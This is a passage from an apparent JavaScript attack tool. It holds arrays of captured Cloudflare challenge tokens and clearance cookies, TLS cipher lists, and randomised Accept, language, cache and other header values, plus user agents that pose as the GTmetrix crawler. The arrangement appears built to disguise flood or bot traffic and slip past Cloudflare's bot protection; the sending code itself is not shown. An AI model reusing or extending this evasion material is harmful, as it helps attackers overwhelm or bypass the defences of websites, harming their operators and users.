"?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA", "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U", "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU", "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs", "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA", "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A", "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs", "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA", "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU", "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs", "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA", "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0", "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh", "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0", "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0", "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0", "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU", "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU", "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA", "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU", "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU", "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs", "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA", "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A", "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs", "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs"],
  QIik = ["ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES", "ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK"],
  sKlk = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip,application/x-bzip2", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel,application/vnd.openxmlformats-officedocument.wordprocessingml.document,application/vnd.openxmlformats-officedocument.spreadsheetml.sheet,application/vnd.openxmlformats-officedocument.presentationml.presentation,application/pdf,application/zip,application/x-gzip,application/x-bzip2,application/x-lzma", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel", "text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8"],
  MFck = ["ko-KR", "en-US", "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", "en-GB,en;q=0.5", "en-CA", "en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA", "en-IN", "en-PH", "en-SG", "en-HK", "en-GB,en;q=0.8", "en-GB,en;q=0.9", " en-GB,en;q=0.7", "en-US,en;q=0.9", "en-GB,en;q=0.9", "en-CA,en;q=0.9", "en-AU,en;q=0.9", "en-NZ,en;q=0.9", "en-ZA,en;q=0.9", "en-IE,en;q=0.9", "en-IN,en;q=0.9", "ar-SA,ar;q=0.9", "az-Latn-AZ,az;q=0.9", "be-BY,be;q=0.9", "bg-BG,bg;q=0.9", "bn-IN,bn;q=0.9", "ca-ES,ca;q=0.9", "cs-CZ,cs;q=0.9", "cy-GB,cy;q=0.9", "da-DK,da;q=0.9", "de-DE,de;q=0.9", "el-GR,el;q=0.9", "es-ES,es;q=0.9", "et-EE,et;q=0.9", "eu-ES,eu;q=0.9", "fa-IR,fa;q=0.9", "fi-FI,fi;q=0.9", "fr-FR,fr;q=0.9", "ga-IE,ga;q=0.9", "gl-ES,gl;q=0.9", "gu-IN,gu;q=0.9", "he-IL,he;q=0.9", "hi-IN,hi;q=0.9", "hr-HR,hr;q=0.9", "hu-HU,hu;q=0.9", "hy-AM,hy;q=0.9", "id-ID,id;q=0.9", "is-IS,is;q=0.9", "it-IT,it;q=0.9", "ja-JP,ja;q=0.9", "ka-GE,ka;q=0.9", "kk-KZ,kk;q=0.9", "km-KH,km;q=0.9", "kn-IN,kn;q=0.9", "ko-KR,ko;q=0.9", "ky-KG,ky;q=0.9", "lo-LA,lo;q=0.9", "lt-LT,lt;q=0.9", "lv-LV,lv;q=0.9", "mk-MK,mk;q=0.9", "ml-IN,ml;q=0.9", "mn-MN,mn;q=0.9", "mr-IN,mr;q=0.9", "ms-MY,ms;q=0.9", "mt-MT,mt;q=0.9", "my-MM,my;q=0.9", "nb-NO,nb;q=0.9", "ne-NP,ne;q=0.9", "nl-NL,nl;q=0.9", "nn-NO,nn;q=0.9", "or-IN,or;q=0.9", "pa-IN,pa;q=0.9", "pl-PL,pl;q=0.9", "pt-BR,pt;q=0.9", "pt-PT,pt;q=0.9", "ro-RO,ro;q=0.9", "ru-RU,ru;q=0.9", "si-LK,si;q=0.9", "sk-SK,sk;q=0.9", "sl-SI,sl;q=0.9", "sq-AL,sq;q=0.9", "sr-Cyrl-RS,sr;q=0.9", "sr-Latn-RS,sr;q=0.9", "sv-SE,sv;q=0.9", "sw-KE,sw;q=0.9", "ta-IN,ta;q=0.9", "te-IN,te;q=0.9", "th-TH,th;q=0.9", "tr-TR,tr;q=0.9", "uk-UA,uk;q=0.9", "ur-PK,ur;q=0.9", "uz-Latn-UZ,uz;q=0.9", "vi-VN,vi;q=0.9", "zh-CN,zh;q=0.9", "zh-HK,zh;q=0.9", "zh-TW,zh;q=0.9", "am-ET,am;q=0.8", "as-IN,as;q=0.8", "az-Cyrl-AZ,az;q=0.8", "bn-BD,bn;q=0.8", "bs-Cyrl-BA,bs;q=0.8", "bs-Latn-BA,bs;q=0.8", "dz-BT,dz;q=0.8", "fil-PH,fil;q=0.8", "fr-CA,fr;q=0.8", "fr-CH,fr;q=0.8", "fr-BE,fr;q=0.8", "fr-LU,fr;q=0.8", "gsw-CH,gsw;q=0.8", "ha-Latn-NG,ha;q=0.8", "hr-BA,hr;q=0.8", "ig-NG,ig;q=0.8", "ii-CN,ii;q=0.8", "is-IS,is;q=0.8", "jv-Latn-ID,jv;q=0.8", "ka-GE,ka;q=0.8", "kkj-CM,kkj;q=0.8", "kl-GL,kl;q=0.8", "km-KH,km;q=0.8", "kok-IN,kok;q=0.8", "ks-Arab-IN,ks;q=0.8", "lb-LU,lb;q=0.8", "ln-CG,ln;q=0.8", "mn-Mong-CN,mn;q=0.8", "mr-MN,mr;q=0.8", "ms-BN,ms;q=0.8", "mt-MT,mt;q=0.8", "mua-CM,mua;q=0.8", "nds-DE,nds;q=0.8", "ne-IN,ne;q=0.8", "nso-ZA,nso;q=0.8", "oc-FR,oc;q=0.8", "pa-Arab-PK,pa;q=0.8", "ps-AF,ps;q=0.8", "quz-BO,quz;q=0.8", "quz-EC,quz;q=0.8", "quz-PE,quz;q=0.8", "rm-CH,rm;q=0.8", "rw-RW,rw;q=0.8", "sd-Arab-PK,sd;q=0.8", "se-NO,se;q=0.8", "si-LK,si;q=0.8", "smn-FI,smn;q=0.8", "sms-FI,sms;q=0.8", "syr-SY,syr;q=0.8", "tg-Cyrl-TJ,tg;q=0.8", "ti-ER,ti;q=0.8", "tk-TM,tk;q=0.8", "tn-ZA,tn;q=0.8", "tt-RU,tt;q=0.8", "ug-CN,ug;q=0.8", "uz-Cyrl-UZ,uz;q=0.8", "ve-ZA,ve;q=0.8", "wo-SN,wo;q=0.8", "xh-ZA,xh;q=0.8", "yo-NG,yo;q=0.8", "zgh-MA,zgh;q=0.8", "zu-ZA,zu;q=0.8"],
  oHfk = ["gzip, deflate, br", "gzip, deflate, br, zstd", "compress, gzip", "deflate, gzip", "gzip, identity", "*", "*", "*/*", "gzip", "gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", "br", "br;q=1.0, gzip;q=0.8, *;q=0.1", "gzip;q=1.0, identity; q=0.5, *;q=0", "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", "identity", "gzip, compress", "compress, deflate", "compress", "gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", "deflate"],
  ICWj = ["max-age=604800", "proxy-revalidate", "public, max-age=0", "max-age=315360000", "public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800", "s-maxage=604800", "max-stale", "public, immutable, max-age=31536000", "must-revalidate", "private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "max-age=31536000,public,immutable", "max-age=31536000,public", "min-fresh", "private", "public", "s-maxage", "no-cache", "no-cache, no-transform", "max-age=2592000", "no-store", "no-transform", "max-age=31557600", "stale-if-error", "only-if-cached", "max-age=0", "must-understand, no-store", "max-age=31536000; includeSubDomains", "max-age=31536000; includeSubDomains; preload", "max-age=120", "max-age=0,no-cache,no-store,must-revalidate", "public, max-age=604800, immutable", "max-age=0, must-revalidate, private", "max-age=0, private, must-revalidate", "max-age=604800, stale-while-revalidate=86400", "max-stale=3600", "public, max-age=2678400", "min-fresh=600", "public, max-age=30672000", "max-age=31536000, immutable", "max-age=604800, stale-if-error=86400", "public, max-age=604800", "no-cache, no-store,private, max-age=0, must-revalidate", "o-cache, no-store, must-revalidate, pre-check=0, post-check=0", "public, s-maxage=600, max-age=60", "public, max-age=31536000", "max-age=14400, public", "max-age=14400", "max-age=600, private", "public, s-maxage=600, max-age=60", "no-store, no-cache, must-revalidate", "no-cache, no-store,private, s-maxage=604800, must-revalidate", "X-Access-Control: Allow-Origin", "Cache-Control: no-cache, no-store, must-revalidate", "Authorization: Bearer your_token", "Content-Control: no-transform", "X-RateLimit-Limit: 1000", "Proxy-Connection: keep-alive", "X-Frame-Options: SAMEORIGIN", "Strict-Transport-Security: max-age=31536000; includeSubDomains", "X-Content-Type-Options: nosniff", "Retry-After: 120", "Connection: close", "Accept-Ranges: bytes", "ETag: \"33a64df551425fcc55e4d42a148795d9f25f89d4\"", "X-DNS-Prefetch-Control: off", "Expires: Thu, 01 Jan 1970 00:00:00 GMT", "X-Download-Options: noopen", "X-Permitted-Cross-Domain-Policies: none", "X-Frame-Options: DENY", "Expect-CT: max-age=86400, enforce", "Upgrade-Insecure-Requests: 1", "X-Forwarded-Proto: https", "Access-Control-Allow-Origin: *", "X-Content-Duration: 3600", "Alt-Svc: h3=\":443\"", "X-XSS-Protection: 1; mode=block", "Referrer-Policy: no-referrer", "X-Pingback: /xmlrpc.php", "Content-Encoding: gzip", "Age: 3600", "X-Clacks-Overhead: GNU Terry Pratchett", "Server: Apache/2.4.41 (Unix)", "X-Powered-By: PHP/7.4.3", "Allow: GET, POST, HEAD", "Retry-After: 3600", "Access-Control-Allow-Methods: GET, POST, OPTIONS", "X-UA-Compatible: IE=edge", "Public-Key-Pins: max-age=5184000; pin-sha256=\"base64+primary==\"; pin-sha256=\"base64+backup==\"; includeSubDomains; report-uri=\"https://example.com/hpkp-report\"", "Content-Language: en-US", "X-Permitted-Cross-Domain-Policies: none", "Strict-Transport-Security: max-age=15768000; includeSubDomains", "Access-Control-Allow-Headers: Content-Type", "X-Frame-Options: ALLOW-FROM https://example.com/", "X-Robots-Tag: noindex, nofollow", "Access-Control-Max-Age: 3600", "X-Cache-Status: MISS", "Vary: Accept-Encoding", "X-GeoIP-Country-Code: US", "X-Do-Not-Track: 1", "X-Request-ID: 12345", "X-Correlation-ID: abcde", "DNT: 1", "X-Device-Type: mobile", "X-Device-OS: Android", "X-Device-Model: Galaxy S10", "X-App-Version: 2.1.0", "X-User-ID: 123", "X-Session-ID: xyz", "X-Feature-Flag: new_feature_enabled", "X-Experiment-ID: experiment_123", "X-Ab-Test: variant_b", "X-Tracking-Consent: accepted", "X-Customer-Segment: premium", "X-User-Role: admin", "X-Client-ID: client_567", "X-Internal-Request: true", "X-Service-Name: backend-api", "X-Backend-Server: server-1", "X-Database-Query: SELECT * FROM users", "X-Cache-Control: no-store", "X-Environment: production", "X-Debug-Mode: false", "X-Remote-IP: 203.0.113.195", "X-Proxy: true", "X-Origin: https://www.example.com", "X-FastCGI-Cache: HIT", "X-Pagination-Total: 1000", "X-Pagination-Page: 5", "X-Pagination-Limit: 20", "X-Notification-Count: 3", "X-Message-ID: msg_123", "X-Notification-Type: alert", "X-Notification-Priority: high", "X-Queue-Depth: 50", "X-Queue-Position: 10", "X-Queue-Status: active", "X-Content-Hash: sha256=abcdef123456", "X-Resource-ID: resource_789", "X-Resource-Type: article", "X-Transaction-ID: tx_456", "X-Transaction-Status: success", "X-Transaction-Amount: $100.00", "X-Transaction-Currency: USD", "X-Transaction-Date: 2024-01-24T12:00:00Z", "X-Payment-Method: credit_card", "X-Payment-Status: authorized", "X-Shipping-Method: express", "X-Shipping-Cost: $10.00", "X-Subscription-Status: active", "X-Subscription-Type: premium", "Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64"],
  kEZj = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 GTmetrix", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 GTmetrix", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 GTmetrix", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 GTmetrix", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36 GTmetrix", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:54.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/54.0", "Mozilla/5.0 (Linux; Android 4.3; Galaxy Nexus Build/JWR66Y; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:53.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/53.0", "Mozilla/5.0 (X11; Linux x86_64; rv:49.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Linux; Android 4.3; Galaxy Nexus Build/JWR66Y; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.68 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64; rv:47.0; GTmetrix https://gtmetrix.com/) Gecko/20100101 Firefox/47.0", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36", "Mozilla/5.0 (Linux; Android 4.1.2; Galaxy Nexus Build/JZO54K; GTmetrix https://gtmetrix.com/) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/26.0.1410.58 Mobile Safari/537.22", "Mozilla/5.0 (X11; Linux x86_64; GTmetrix https://gtmetrix.com/) AppleWebKit/537.36 (KHTML, like Gecko) 